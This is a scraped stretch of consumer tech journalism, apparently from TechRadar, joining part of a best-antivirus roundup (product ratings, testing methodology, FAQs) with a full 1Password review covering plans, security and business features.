\u2b50\u2b50\u2b50\u2b50 |\nAdvanced tools | Not as many tools as other antivirus software, but the ones included are helpful | \u2b50\u2b50\u2b50\u2b50 |\nCustomer support | Live support is available including remote support for difficult issues | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nValue | First-time users get a great bargain, but the price jumps higher on renewal | \u2b50\u2b50\u2b50\u2b50 |\nRead our full F-Secure review here.\nBest for ad blocking\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You want a reliable ad-blocker: Avira includes a handy ad blocker to keep your browsing fast and hassle free.\n\u2714\ufe0f You'd like to try before buying: Avira's free plan is limited, but gives you a good taste of what to expect if you choose to upgrade.\n\u2714\ufe0f You want configurability: Avira gives users plenty of ways to tailor their security experience.\nDon't use if:\n\u274c You use a lot of locally saved apps: during my testing, I found that Avira causes apps to launch more slowly.\n\u274c You need mobile protection: most of Avira's packages aren't available for mobile devices\u2014and those that are have a hefty price tag.\n\u274c You want optimal PC performance: Avira has a tendency to take a bit out of your device performance.\nOur thoughts:\nAvira performs really well in testing, being able to detect our own bespoke EICAR files and performing well against existing and new threats in tests done by third parties.\nA standout point is the included ad blocker which significantly improves web page load times and general user experience. Avira Internet Security also includes a handy bargain hunting tool to help you get the best deals when shopping online. While it does include a system optimizer tool and PUA shield to reduce PC slowdown, it does tend to take up a few more resources than we would like - but overall it is a solid antivirus solution.\n\u25b6 Try Avira antivirus for free\nBottom line: \u2b50\u2b50\u2b50\u2b50\n\ud83d\udd12 Avira has a lot of handy tools that can be configured down to the last detail and a free plan you can use to try before you buy\u2014however, it's not the best pick for mobile devices.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | No problem stopping both known and new malware threats | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nPerformance | Slower at loading webpages and downloading software | \u2b50\u2b50\u2b50\u2b50 |\nEase of use | Dark mode interface that is intuitively laid out, but most tools, including ransomware protections, have to be turned on | \u2b50\u2b50\u2b50 |\nAdvanced tools | Includes some good advanced security tools, but not enough to be compared with other \"internet security\" suites | \u2b50\u2b50\u2b50 |\nCustomer support | Some basic help articles are online, the only way to contact a live agent is through the email form | \u2b50\u2b50\u2b50 |\nValue | Decent price point and has a monthly subscription available | \u2b50\u2b50\u2b50\u2b50 |\nRead our full Avira review here.\nBest for gamers\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You want the best malware protection: Avast came out on top in all of our malware-blocking tests.\n\u2714\ufe0f Gaming is your priority: block untrustworthy incoming connections with a handy gaming mode\u2014which is enabled by default.\n\u2714\ufe0f You want to try before buying: Avast's free plan has its limitations, but effectively showcases the product's capabilities.\nDon't use if:\n\u274c You don't want to delete unwanted apps: Avast will do its very best to install its own internet browser and make it your new default, which is slightly frustrating.\n\u274c You need better VPN access: depending on your plan, you might experience bandwidth caps and a limited choice of servers\n\u274c You need clear warnings: at times, unwarranted warnings can pop up with no clear way to stop them\nOur thoughts:\nAvast is one of the best performing antivirus software providers, scoring top marks in our testing and achieving impressive results in testing performed by the third party pros.\nAvast One is designed to be a simple all-in-one app that does everything it says on the tin, and if you want it to do more, it can. The app automatically goes into gaming mode so that you can squeeze all the performance you need out of your device without your security taking a hit. Avast One comes with more features than I can list, but some notable inclusion are dark web monitoring, scam detection, and an advanced firewall to keep hackers out of your network.\nBottom line: \u2b50\u2b50\u2b50\u2b50\n\ud83d\udd12 Avast One is a malware-blocking powerhouse that stops threats dead in their tracks.

In our own testing (and independent testing), it scored in the middle ground of what I would expect.\nBut, as I said, if you currently have malware lurking on your device then Malwarebytes is a solid tool for getting rid of it - and what Malwarebytes lacks in testing scores, it makes up for in features. The software will provide real time protection reports, scam protection, and even includes AI-powered protection. Some features are only available on the Windows app however.\n\u25b6 Get Malwarebytes free edition\nBottom line: \u2b50\u2b50\u2b50\u00bd\n\ud83d\udd12 Malwarebytes excels at removing malware already on your device, but can fall short in real-time protection.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | Not as effective at blocking malware as it is at removing current infections | \u2b50\u2b50\u2b50\u2b50 |\nPerformance | Fairly light on resources, so not a problem to run it in the background | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nEase of use | Basic use is easy to figure out, but it gets harder when you need to customize settings | \u2b50\u2b50\u2b50\u2b50 |\nAdvanced tools | Doesn't have the level of advanced features we'd expect in a Pro program | \u2b50\u2b50\u2b50 |\nCustomer support | All support links redirect you to its extensive knowledgebase rather than provide live support options right away | \u2b50\u2b50\u2b50 |\nValue | Monthly subscription prices are about right for what is offered | \u2b50\u2b50\u2b50\u2b50 |\nRead our full Malwarebytes review here.\nBest for Mac\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You're a Mac user: Intego is designed specifically for Mac machines.\n\u2714\ufe0f You need parental controls: you won't find many other antivirus solutions for Mac that include configurable parental controls.\n\u2714\ufe0f You want to boost your Mac performance: Intego's Mac Washing Machine can spot vulnerable software and old apps and help clear them up.\nDon't use if:\n\u274c You need mobile protection: unfortunately, this antivirus offering is only available for desktops.\n\u274c You're looking for powerful extras: Intego doesn't have the quantity, or quality, of advanced features as our other picks.\n\u274c You have a mixed device household: households with a mix of different operating systems won't all benefit from the same plan.\nOur thoughts:\nIntego scores well in testing across the board and is specially built to be friendly to Mac machines. In fact, it offers a Mac Washing Machine tool to keep your device free of vulnerable and outdated applications that could be a potential virus entry point.\nOutside of scoring though, there is a bit of a downside. Each of the five security applications included in the Intego Mac Premium Bundle X9 has to be installed individually, and while this is great for those looking to pick and choose what parts they use, many of the other providers have a single app that includes all the various protection tools. If you don't mind taking the time to install them, Intego makes an excellent Mac protection antivirus.\nBottom line: \u2b50\u2b50\u2b50\u00bd\n\ud83d\udd12 Intego is a great pick for Mac machines, and can clean up your system to keep it running efficiently.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | Misses a few threats, but does score higher than average for malware detection | \u2b50\u2b50\u2b50\u2b50 |\nPerformance | We noticed a bit of lag with the app itself, but it didn't seem to affect our working and browsing too much | \u2b50\u2b50\u2b50\u2b50 |\nEase of use | Each tool is a separate download with its own dashboard making it harder to navigate the entire package | \u2b50\u2b50\u2b50 |\nAdvanced tools | A bit limited, but the system cleaner and parental controls are effective | \u2b50\u2b50\u2b50 |\nCustomer support | Lots of pages to navigate through the find the support email form, live chat is sometimes available | \u2b50\u2b50\u2b50 |\nValue | It's expensive, other Mac antivirus is available for cheaper and with more tools | \u2b50\u2b50\u2b50 |\nRead our full Intego review here.\nBest for banking\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You bank or shop online: PayGuard, Trend Micro's secure banking feature, is one of the best in the industry.\n\u2714\ufe0f You want web protection: Trend Micro has a robust URL blocker that will warn you if you stumble across a dangerous site.\n\u2714\ufe0f You don't want too many bells and whistles: Trend Micro offers a simple antivirus software without any overwhelming tools and options.\nDon't use if:\n\u274c You're an avid gamer: Trend Micro has a noticeable impact on device performance, and can interrupt gameplay (and streaming.)\n\u274c You want to customize your experience: if you're looking for an antivirus solution you can customize, you're better off with Bitdefender.\n\u274c You are looking for more than just antivirus: Trend Micro lacks the extra features to protect more than just your device.\nOur thoughts:\nTrend Micro sits in the middle ground in terms of antivirus protection, both in our own testing and testing done by the independent labs, but is near-unrivaled when it comes to banking protection.\nTrend Micro Antivirus+ Security offers a tool known as PayGuard, which helps keeps payments made through your browser secure and out of the clutches of any hackers that could be lurking online. Trend Micro does unfortunately hamper device performance and doesn't offer as many extra security features as its rivals - which could be a good thing for those looking for a simple and easy to use solution.\n\u25b6 Try Trend Micro Antivirus+ Security for 30 days risk-free\nBottom line: \u2b50\u2b50\u2b50\n\ud83d\udd12 Trend Micro doesn't come with a ton of added features, but if you need a boost of security for your banking and online shopping, Pay Guard is a fantastic option.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | Struggles a bit to stop brand new threats not included in malware databases | \u2b50\u2b50\u2b50\u2b50 |\nPerformance | Causes some slowdown when downloading programs or launching an application | \u2b50\u2b50\u2b50\u2b50 |\nEase of use | Very simple interface with essential security tools you need already turned on | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nAdvanced tools | Not a lot is included with its basic subscription, but Pay Guard comes with all antivirus subscriptions | \u2b50\u2b50\u2b50 |\nCustomer support | Phone, email, and chat support are all available, but there may be some delays when trying to connect | \u2b50\u2b50\u2b50\u2b50 |\nValue | Not too bad for basic protection of a single Windows device | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nRead our full Trend Micro review here.\nBest for customization\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You want an antivirus you can configure: plenty of low-level configurability gives you granular control over setup and features.\n\u2714\ufe0f You need multi-device support: with ESET, you can choose how many devices to include in your subscription.\n\u2714\ufe0f You want to protect multiple network devices: everything that you connect to your Wi-Fi network is protected, including IoT and smart devices.\nDon't use if:\n\u274c You need a wide array of tools: ESET isn't as feature-rich as its closest competitors, though its advanced tools are still solid.\n\u274c You want iOS support: if you want to secure your iPhone or iPad, I'd recommend checking out Bitdefender's mobile apps.\n\u274c You want zero-day malware protection: ESET reserves its top level of protection for the more expensive subscriptions.\nOur thoughts:\nIn terms of protection, ESET antivirus software sits in the big leagues with the likes of Avast and Bitdefender - but this level of protection comes at a cost, even without all the extras.\nThe ESET Essential plan is exactly that, just the essentials. You get antivirus protection for one device, plus a firewall, banking protection, and a network shield to protect internet connected devices. So if you're looking for a feature-rich package, you will have to opt for the highest tier subscription. If you do, you can access an unlimited VPN, identity protection, and a password manager - but keep in mind many other brands provide these without breaking the bank.\n\u25b6 Try ESET Internet Security for 30 days free\nBottom line: \u2b50\u2b50\u2b50\n\ud83d\udd12 ESET is easy to install, though a little more difficult to figure out once it's up and running.

Bitdefender | Sets the standard for all antivirus to reach for |\n2. Norton | Good protection and great identity theft services |\n3. Avast | Easy to use, great advanced security, excellent gaming mode |\n4. McAfee | Good for mobile, and decent on other devices, too, but expensive |\n5. F-Secure | Protects smart devices, such as TVs and Amazon Echo connected to your network |\n6. Trend Micro | Good protections for banking and shopping online |\n7. AVIRA | Decent tools with a good free antivirus available |\n8. ESET | Okay for basic protection, but feels outdated and falls behind better options |\n9. Malwarebytes | Not the best as a first defender malware blocker, but is excellent at removing threats already on your device |\n10. Intego | Specifically designed for Mac computers, does well at blocking threats, but awkward to use |\nHow to choose antivirus software\nHow do you decide on just one antivirus solution when there are dozens of viable candidates out there? The obvious answer is to consult our rankings\u2014our shortlist is the result of pooled expert knowledge, in-house testing, third-party security labs testing, and thorough, continually updated reviews of the top antivirus players.\nPerhaps more importantly, however, you need to consider your own needs and use case. Do you have a ton of devices to protect? Do you need advanced features or specific tools? Do you want a service with a built-in VPN to save money on subscription fees?\nThese considerations will vary from person to person and might mean that our number one pick isn't your match made in heaven. Our recommendations can point you in the direction of some stellar options, but you'll need to modify these based on your individual requirements.\nFor more thoughts on this, check out our article exploring how to choose the best antivirus.\nHow we test antivirus software - our review methodology\nTo get a clear, accurate, and thorough picture of each antivirus, I take a multi-faceted approach to my testing\u2014and I make sure I get hands-on experience with each product.\nThanks to our team's background in IT, we're able to create malware files for specific use in testing environments. We keep these files on a short leash and let them wreak a little havoc\u2014nothing that we can't control, of course\u2014but this is an important part of the process, seeing as they're new threats that no antivirus software will be familiar with.\nLots of antivirus developers provide a test file called 'EICAR' that simulates a threat that isn't a threat. The problem with relying on this file during testing is that antivirus companies have made sure that their software recognizes it. Using our own bespoke malware helps us evaluate how well these services deal with the unknown.\nWe don't rely solely on our findings, however. There are all sorts of ways to test antivirus and some fantastic labs out there that do it a lot more frequently than we do. That's why we refer to results from AV-Comparatives and AV-Tests to paint a broader picture of the antivirus software's capabilities and assign a fair protection score.\nPerformance is a critical consideration during our testing. We need to know how much slowdown is caused by installing and running the antivirus, and how much it's going to impact your day-to-day activities. After all, an antivirus that zaps every threat known to man, but slows your machine down to a crawl, won't be much use to anyone.\nWe know that resources will be used, seeing as the antivirus programs are saved locally on the device, but we still measure things like how long it takes to open a browser, navigate to a website, attach a file to an email, or how long it takes a webpage to load fully.\nOnline speed test websites give us a hand with this process by providing the nit-picky numbers to supplement our real-time testing. That way, we can balance solid statistics with our individual experiences, to get a real feel for how the antivirus behaves outside of a lab.\nAs you'd expect, real-time testing involves us installing and using antivirus programs on our home devices. We'll keep track of anything out of the ordinary, the highs and lows, and how easy the software is to navigate. This is also where we'll dig into the tools and settings to see if they do everything that they're supposed to do\u2014think password managers, file encryption, VPN add-ons, and parental controls.\nCustomer support is another important aspect of any review. Usually, it's easy enough to follow along with the on-screen instructions provided by the installation wizard when you download new antivirus software, but that doesn't mean there aren't times when you'll need a little extra help from an agent.\nWe evaluate each company's support options, ranging from the live chat support and email ticketing systems, if available, and the online library of resources. We measure how quickly agents respond to our inquries, how detailed their reply is, and how accessible the company's resources are\u2014particularly for new users.\nTested by\nMike is a lead security reviewer at Future, where he stress-tests VPNs, antivirus and more to find out which services are sure to keep you safe, and which are best avoided.\nSead is a seasoned freelance journalist based in Sarajevo, Bosnia and Herzegovina. He covers all things cybersecurity, including ID theft, ransomware, and data breaches, as well as laws and regulations related to the field.\nThe best antivirus FAQs\nWhat is the best antivirus of 2025\nI put all of today's top dogs to the test and found that Bitdefender is the best antivirus software in 2025.\nIt's a superb bit of kit\u2014from its entry-level Bitdefender Antivirus Plus and its cast-iron malware defenses, excellent threat detection and genuinely value-adding extra features, right up to its all-singing, all-dancing Total Security that adds an array of maintenance tools and can be used to protect your family's computers, tablets and phones.\nWhat does antivirus do? How does virus protection work?\nAn antivirus app sits on your device like a guard dog, watching over the entire system and sniffing out suspicious intruders. In short, it offers real-time defenses against viruses or other threats, which, if detected, are immediately dealt with, preventing them from carrying out their destructive payload. As well as this automated protection, you can run manual virus scans whenever you wish.\nAntivirus applications use what are called virus \u2018definitions\u2019 to catch intruders. Think of these as the fingerprints of malware, and if something is spotted coming onto your system that has a matching fingerprint, the antivirus leaps into action, quarantining the offender. As another line of defense, antivirus programs also use what are called \u2018heuristics\u2019 that look for any file or process exhibiting suspicious behavior\u2014this allows the app to potentially catch any freshly made malware that isn\u2019t yet in its definitions database.\nFor more details on this topic, see our full breakdown of exactly how antivirus software works.\nDo I really need antivirus in 2025?\nThe internet is jam-packed with threats, like ransomware, cooked up by cybercriminals willing to do whatever it takes to get what they want. Security breaches are commonplace, unfortunately, and hackers use malware to crack a company's system and make off with important files\u2014including customer information. Unfortunately, that means that you're the ultimate victim of these attacks, seeing as they can lead to identity theft.\nToday's best antivirus programs can help prevent identity theft by keeping an eye on the dark web, where all sorts of personal information is bought and sold. You'll also get protection against phishing scams, and block messages designed to trick you into handing over personal information to dodgy third parties.\nMore and more antivirus software includes a VPN, too, which will safeguard your browsing sessions regardless of the device you're using. You'll be able to bypass geo-restrictions and blocks, and avoid cookies, trackers, and invasive ads.\nYou may have heard arguments that if you\u2019re prudent about where you browse on the web, and what you download or click on, you\u2019ll be fine\u2014and that\u2019s true to a certain extent, but I really wouldn\u2019t risk it. Even well-known websites might occasionally be victims of malware being peddled via their adverts (in other words, the ad networks they work with), for example, so no matter how cautious and tech-savvy you are, it\u2019s worth having an antivirus app as a fall-back defense.\nFortunately, the best antivirus products are getting more and more affordable\u2014and free antivirus keeps improving, too.\nIs free antivirus enough?\nUnfortunately, there's not a simple yes or no answer to this question.\nA good free antivirus can boost your digital security, and a lot of folks will rely on Microsoft Defender to do the job. The good news is that Microsoft Defender is a decent option that'll cover all of the basics when it comes to putting a stop to viruses and malware.\nYou'll find that most free antivirus use the same protection engine (the central tech that monitors your device and thwarts threats) as their paid counterparts.\nHowever, premium antivirus programs offer extra features above and beyond the fundamentals.

      "text": "TechRadar Verdict\n1Password is affordable and effective, so it\u2019s an ideal password manager for individuals and businesses \u2013 and its broad platform support, browser functionality, and clean interface design make it versatile too.\nPros\n- +\nEasy to use\n- +\nBroad device compatibility\n- +\nSome subscriptions include document storage\nCons\n- -\nNo free option\n- -\nLogging in online can be a faff\nWhy you can trust TechRadar\nUsing a password manager is crucial if you want to protect your important information and ensure that you\u2019re covered if you forget one of those all-important codes. If you\u2019re looking for the best password manager, consider 1Password. This app has a strong business pedigree, with companies like IBM, GitLab, and Slack trusting the software to keep passwords secure and consistent. With customers like that, it\u2019s undeniably a top option for your family or organization.\nLike any technology solution, 1Password has its mix of advantages and disadvantages. In this blog post, we'll explore the pros and cons of using 1Password to help you decide if it's the right password manager.\nOne of 1Password\u2019s most significant advantages is its strong focus on security. It utilizes end-to-end encryption, meaning your data is encrypted before it leaves your device and can only be decrypted with your Master Password, which 1Password does not store or have access to. This approach minimizes the risk of data breaches and unauthorized access.\n1Password boasts a sleek and intuitive interface that simplifies password management whether using the desktop app, browser extension, or mobile app, navigating through your data and accessing your passwords is straightforward and hassle-free.\nWith the increasing importance of two-factor authentication (2FA), 1Password's ability to generate and store one-time passwords (OTPs) is a significant plus. This feature enhances security and consolidates your login and 2FA data in one spot.\nAnother notable advantage of 1Password is the ability to securely share passwords and sensitive information with family members or team members. Depending on your subscription plan, you can control who can access specific items, ensuring that sensitive data is only shared with authorized individuals.\n1Password supports various devices and platforms, including Windows, macOS, iOS, Android, and Linux. It also offers extensions for popular web browsers, ensuring you can access your passwords no matter where or what device you're using.\nSign up to the TechRadar Pro newsletter to get all the top news, opinion, features and guidance your business needs to succeed!\nUnlike some competitors offering a free version, 1Password operates on a subscription model. While there is a 14-day free trial, long-term use requires a subscription. This ongoing cost may be a drawback for users who prefer a one-time purchase or a free solution.\nFor users new to password managers, the array of features and settings with 1Password can be overwhelming at first. While user-friendly, there's a learning curve to utilize all its functionalities efficiently.\nWhile 1Password's free trial allows users to explore its features, it could be more robust in functionality compared to the full version. This limitation might not provide a comprehensive user experience assessing the tool's capabilities.\nFor the highly security-conscious, storing sensitive information in the cloud (even with solid encryption) might be a concern due to the theoretical risks of cloud breaches. Although 1Password's security is top-notch, the very nature of cloud storage can be a deal-breaker for some.\nCertain features of 1Password, such as accessing your password vault from a new device, require an internet connection. While you can view and use stored passwords offline, initial setup and synchronization across devices need the internet.\nWe\u2019ve evaluated 1Password\u2019s family and business plans to see if this app is worth using \u2013 or if you should seek out a competitor instead. And if you want to explore those alternatives, take a look at our roundup of the best business password managers.\n1Password: Plans and pricing\n1Password offers different plans tailored to fit individual and business needs. Let's take a closer look:\nFor Individuals and Families\n* Individual Plan (from $2.99 per month): Designed for one person, this plan includes access to all devices, protection for your data, and around-the-clock email support.\n* Family Plan ($4.99 per month for up to five): This plan is ideal for household use. It has all the features of the individual plan but allows you to share passwords, credit cards, secure notes, and more with family members.\nFor Teams and Businesses\n* Teams Plan ($20 per month for up to 10 users): Built for collaboration, this plan provides features that help manage team access to shared vaults, with admin controls and secure document storage.\n* Business Plan ($8 per user per month): Tailored for larger organizations, the business plan includes everything from the Teams plan and additional advanced tools for security audits, custom roles, and more.\n1Password may also offer unique plans, typically discounted, targeted at specific users, such as students, educators, or non-profit organizations.\n1Password: Setup\nAs a leading password manager that simplifies password management while bolstering security, setting up 1Password in a work environment is a strategic move towards enhancing your company's digital security posture. In this guide, we'll walk you through every step of the process.t\nBefore diving into the setup, it's crucial to understand why 1Password is an asset for any organization. It goes beyond storing passwords - 1Password can manage secure notes, documents, and credentials, ensuring that all sensitive information is kept within a tamper-proof digital vault. Additionally, it enhances productivity by streamlining the login process for various work tools and platforms, reducing the time employees spend managing their passwords.\nStep 1: Sign Up and Create Your Account\nBegin by visiting the 1Password website and signing up for the plan that best suits your organization's needs. During this process, you'll create an account that will serve as the main administrative hub for managing your team or business.\nStep 2: Configure Your Vault\nUpon setting up your account, the next step is to configure your vaults. Vaults are secure containers where items like passwords, notes, and documents are stored. You can create multiple vaults for different departments or projects to keep your organization's data organized and accessible to the right people.\nStep 3: Adding Users and Groups\nAfter your vaults are configured, you'll need to add your team members. This can be done individually or in bulk through an invitation link or email. Additionally, consider setting up groups for easier management, allowing you to assign vault access to entire teams rather than individual users manually.\nStep 4: Establish Security Policies\nOne of the key benefits of 1Password is the ability to customize security policies. This includes enforcing Two-Factor Authentication (2FA), setting password strength requirements, and configuring other security settings tailored to your organization's security guidelines.\nStep 5: Training and Support\nWith your 1Password setup complete, the final and crucial step is training your team. Ensure that everyone understands how to use 1Password effectively, including storing and managing passwords, using the browser extension, and accessing their vaults. Take advantage of the resources and support provided by 1Password for a smooth transition.\n1Password: Interface and performance\n1Password provides convenient access on virtually all devices. Along with mobile apps for iOS and Android, the platform also provides desktop apps for macOS, Windows, and Linux, plus a command-line tool and extensions for popular browsers including Chrome, Edge, Firefox, Brave, and Safari. There are also some more quirky options, like Apple Watch support.\nIt\u2019s a very intuitive app. On the left-hand side, there\u2019s a navigation column that allows users to access their private or shared vaults, tutorials, and their popular passwords. Here you\u2019ll also find the Watchtower, which keeps track of security breaches and lets you know if your details have been compromised. In the main window, you can see all your passwords, messages or alerts, and the search box \u2013 which is extremely fast.\nAdding new passwords is simple and comprehensive. You\u2019re able to choose from more than two dozen security categories \u2013 from straightforward login and credit card details to medical records and passports \u2013 and each category collects different kinds of relevant information. It makes creating passwords easier \u2013 and speeds up categorization, too.\nThis is a highly responsive app, too, with changes on one device showing up on other devices almost instantaneously. We\u2019re really fond of the small highlights than run across the top of the UI and throughout the experience, such as Wi-Fi passwords, medical records, identity information, and payment details.\nLogging in online is a little more of a task than it is with other password managers. You still use your master password to get in, but you also need to authorize it by copying and pasting a so-called secret key to verify it\u2019s you. We feel this could be handled a little easier, even if by manner of notification to the apps that are already signed in. Dashlane does something similar, and emails a one-time code to the account holder too, just for that extra layer of protection.\n1Password: Security\n1Password uses a wide range of tools to keep your information as secure as possible. Accounts are locked by a master password, which is never shared with 1Password or any third parties. Beyond that, you\u2019ve got your Emergency Kit, which includes a secure key you\u2019ll need to use when logging in.\n1Password provides two-factor authentication with Authy and Microsoft Authenticator, and it comes with security breath alerts, protection against keyloggers, and AES 256-bit encryption. Your passwords are also protected with Secure Remote Password (SRP), which adds another layer of credential authentication.\n1Password Business: Team and Admin Features\n1Password for Business pitches itself as a robust enterprise password management platform that\u2019s designed to meet the needs of businesses of all sizes. It offers a comprehensive set of features that help facilitate secure credential management, while streamlining administrative tasks, and can also integrate with your existing IT infrastructure.\nIts shared vault system is particularly useful for use in a business setting. In the context of a password manager, think of a vault as a secure container that stores login credentials, as well as other secure information like credit card details.\nThe vaults in 1Password Business provide granular access control with over a dozen distinct permissions, which allow you as admins to control who can view, edit, copy, share, or export items within the vaults.\nYou can also choose which apps can be used to access this vault. For instance, if you aren\u2019t using 1Password Business\u2019 developer features, you can disable access to the vaults from the CLI tool. Similarly, if you only want your users to access the vault through the browser extensions, and the Android and iOS apps, you can disable access through its Windows, macOS, and Linux apps.\nThe platform also has an interesting Travel Mode feature that allows your users to temporarily remove access to all but certain vaults that have been marked as Safe for Travel. This helps protect sensitive business credentials and data from potential exposure during travel, especially during border inspections or other security checks.\nLike all its peers, you can also use 1Password Business to create custom groups based on the departments, or projects in your organization. You can then assign specific permissions and responsibilities to these groups, such as the ability to invite, and remove people, create vaults, recover accounts, and more, facilitating efficient delegation and management.\nSetting permissions at the group level allows for scalable permissioning. You can then assign vault access once to the group instead of each user.\nIn addition to regular users, 1Password Business also has a concept of guest users. These are individuals who are granted limited access to specific shared vaults. They don't have their own private vault, nor can they access all the shared vaults within the organization. Instead they can only access a designated vault that you\u2019ve earmarked for them. A guest user can be a freelancer, a contractor, or anyone who needs limited access to specific information, like project-related passwords or client-specific details.\nThe platform also lets you define various security policies. The authentication policy helps create rules to manage how your users authenticate with, and log into the platform. You can use these to require strong master passwords, and select a two-factor authentication (2FA) mechanism. 1Password Business supports multiple 2FA options including the use of an authenticator app, security keys, and the Duo authentication service. You can also choose to make 2FA mandatory for all users.\nThen there are sharing and permissions policies, where you create rules for features like credentials sharing. For instance, if you don\u2019t want your users to share items with anyone, you can restrict them to only share items with someone who uses an email from an approved domain. You can also define the expiration settings for the shares, and more.\nFinally, there are the firewall policies that you can use to restrict access to the platform, based on country, continent, or IP address.\n1Password Business backs it all up with extensive logging and reporting mechanisms that provides a comprehensive trail of all actions within the 1Password account, including who accessed or modified what items and when.\n1Password Business: Integrations and Compatibility\nYour users can access their credentials from various devices and platforms as 1Password offers apps for all the popular desktop and mobile operating systems including Windows, macOS, Linux, iOS, and Android, along with browser extensions for Chrome, Firefox, Safari, and Edge.\n1Password Business also integrates with all the major identity providers (IdPs) such as Google Workspace, Microsoft Entra ID, Okta, OneLogin, JumpCloud, and Rippling through the SCIM Bridge. This helps streamline user management as it allows for automated provisioning and deprovisioning of users and groups.\nThe platform also integrates with leading Security Information and Event Management (SIEM) tools such as Splunk, Sentinel, Elastic, Sumo Logic, Panther, and several others. Thanks to this, the platform can stream activity to the SIEM tools for more detailed auditing and security analysis.\n1Password Business also offers a robust set of developer tools that can help integrate secret management into various stages of the software development lifecycle. For instance, developers can generate, import, and store their SSH keys directly within 1Password, and also help it integrate with Git workflows.\nThen there\u2019s the 1Password CLI that allows developers to securely access items stored in 1Password directly from the terminal. 1Password Business can also integrate with popular CI/CD platforms like GitHub Actions, CircleCI, and Jenkins, and Infrastructure as Code (IaC) tools like Kubernetes, and Terraform.\n1Password also provides an open source Software Development Kits (SDKs) for popular programming languages like Python, and JavaScript, and also offers an extension for the Visual Studio Code IDE.\n1Password Business: Ease of Use and Deployment\nDeploying 1Password Business is relatively straightforward. The initial setup, as outlined earlier, can be completed quickly, and the user onboarding process is intuitive enough.\nFrom an administrative standpoint, the interface is clean and neatly arranged. Most of the regular admin tasks can be completed without too much mucking about the interface, and don\u2019t require extensive technical knowledge. That said, you\u2019ll need to have IT chops to tackle more advanced tasks like IdP integration.\n1Password Business\u2019s web-based admin interface provides an overview of user activity, vault access, security insights, and policy compliance. There\u2019s also an activity log that can help you track events like vault access, user logins, sharing activities, policy changes, and more. All activity is timestamped, and the log can be easily filtered.\nThe platform also has various reports, like breach report, and business watchtower. After you\u2019ve verified the domain controlled by your company, the breach report will flag accounts, information, and employees that have been exposed in data breaches. Then there\u2019s the business watchtower report that identifies security issues like weak passwords, across all your vaults.\nBesides these, you also get detailed usage reports, adoption reports, team reports, devices reports, and more. Then there\u2019s the insights dashboard that offers analytics on data breaches, password health, and team usage.\nAll things considered, the 1Password Business admin interface strikes a good balance between power and simplicity, and works well for all sized organizations.\n1Password: Support\nWith 1Password, you\u2019ll have access to 24/7 support via email. The website states that Business users get VIP support, but it doesn\u2019t explain the difference between regular and VIP\u2014just that help is available \u201cwhenever you need it.\u201d As mentioned above, Enterprise subscriptions come with a dedicated account manager and onboard engineer.\nThe 1Password site also provides helpful articles covering a variety of support topics. These are a great place to start if you run into technical issues or want to learn more about the service\u2019s features. Users can also access security white papers if they\u2019d like a deeper dive into how the service works.\n1Password: The competition\nLastpass, one of the most popular password managers, comes with some notable pros and cons compared to 1Password. Unlike 1Password, Lastpass offers a surprisingly robust free plan that enables users to store and share passwords across all their devices.\nFurthermore, Lastpass Emergency makes it easy to configure a digital will that automatically transfers your information in case of an emergency or death. The only way to set this process up on 1Password is to pay for a family or team plan and create multiple admins or organizers. That said, Lastpass and 1Password come with many of the same features, and their pricing is mostly similar aside from the Lastpass free plan.\nIf you\u2019re after more than a password manager, Dashlane and Proton Pass are among the handful that offer VPN connections for certain plans, all in a bid to keep your identity protected.\n1Password: Final verdict\n1Password offers everything individuals and businesses need to store and share passwords and other sensitive pieces of information. The spread of pricing options means it\u2019s a low-cost way to keep your data safe.\nIn addition to mobile apps, the service is also compatible with macOS, Windows, and Linux along with several browsers. Its flexibility, affordability, and ease of use make it a great option for companies and home users.\nWe've listed the best password recovery software.\nWhat to look for in a password manager\nIn today's world, where digital security breaches are not just common but expected, the importance of robust password management cannot be overstated. Password managers have become essential tools for individuals and businesses striving to secure their digital realms. However, with many market options, it can be challenging to know what features to prioritize when selecting a password manager. Here's a curated checklist to guide your choice.\nNon-Negotiable Features\nEncryption is the foundation of a password manager's security. Choose a service offering strong encryption, such as 256-bit encryption \u2014 the standard governments and militaries use worldwide. This encryption level ensures that even if data gets intercepted, it remains indecipherable without the unique key.\nA zero-knowledge protocol means the service provider does not know your data. Your passwords and sensitive information are encrypted locally on your device before syncing with the server. Ensure your chosen password manager offers end-to-end encryption, with decryption only possible on your device.\nTwo-factor authentication (2FA)\nTwo-factor authentication adds an extra layer of security by requiring a second form of verification beyond just the master password. This could be a biometric scan, a security key, or a code generated by an authenticator app. A password manager that supports 2FA significantly enhances your protection against unauthorized access.\nImportant Usability Features\nYour digital life isn't confined to one device, so your password manager shouldn't be either. Cross-platform compatibility ensures you can access your passwords on a PC, Mac, Android, or iOS device. Check for seamless integration with various operating systems and browsers for a smooth experience.\nOne of the main benefits of a password manager is convenience. Look for features like autofill and auto-login that save time and prevent the risk of typing errors. This facilitates a smoother and faster login process without compromising security.\nStrong, unique passwords are essential for secure accounts. A built-in password generator that can create complex passwords enhances security by eliminating the human tendency to reuse passwords or choose easy-to-guess options.\nAdditional Considerations\nA simple, intuitive interface makes a big difference, especially for teams or individuals less familiar with tech. Ease of use encourages adoption and regular use, which is critical for maintaining security practices.\nConsider recovering access to your account in case of a forgotten master password. Options like account recovery using a trusted device or emergency access for trusted contacts can be life-saving without compromising the security of your data.\nEvaluate the cost relative to the features offered. Many password managers offer a basic level of service for free, with premium features available for a fee. Consider what features are must-haves for you and whether the cost of a premium plan justifies its benefits.\nChoosing the right password manager is a balancing act between security features and usability. The ideal tool secures your digital life from threats while seamlessly integrating into your daily routine. You can select a password manager that protects your information and enhances your online experience by focusing on solid encryption, zero-knowledge architecture, and essential usability features. Remember, in the quest for digital security, your password manager becomes your closest ally.\nMike has worked as a technology journalist for more than a decade and has written for most of the UK\u2019s big technology titles alongside 